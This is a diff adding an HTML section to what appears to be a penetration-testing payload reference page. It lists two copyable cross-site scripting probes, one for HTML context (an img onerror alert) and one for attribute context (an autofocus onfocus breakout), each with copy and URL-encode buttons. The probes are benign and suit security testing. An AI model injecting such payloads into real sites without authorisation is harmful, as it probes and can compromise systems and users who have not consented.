@@ -1,0 +1,34 @@
+<section class="page active">
+  <h1>XSS</h1>
+  <p class="intro">
+    Small reflected and stored XSS probes.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>HTML context</h2>
+    <span></span>
+  </div>
+
+  <div class="payload-block">
+    <div class="payload-box">
+      <code class="copy-text">&lt;img src=x onerror=alert(1)&gt;</code>
+      <button class="copy-icon" type="button" title="Copy">Copy</button>
+      <button class="copy-icon url-encode-button" type="button" title="Copy URL encoded">URL</button>
+    </div>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Attribute context</h2>
+    <span></span>
+  </div>
+
+  <div class="payload-block">
+    <div class="payload-box">
+      <code class="copy-text">" autofocus onfocus=alert(1) x="</code>
+      <button class="copy-icon" type="button" title="Copy">Copy</button>
+      <button class="copy-icon url-encode-button" type="button" title="Copy URL encoded">URL</button>
+    </div>
+  </div>
+</section>
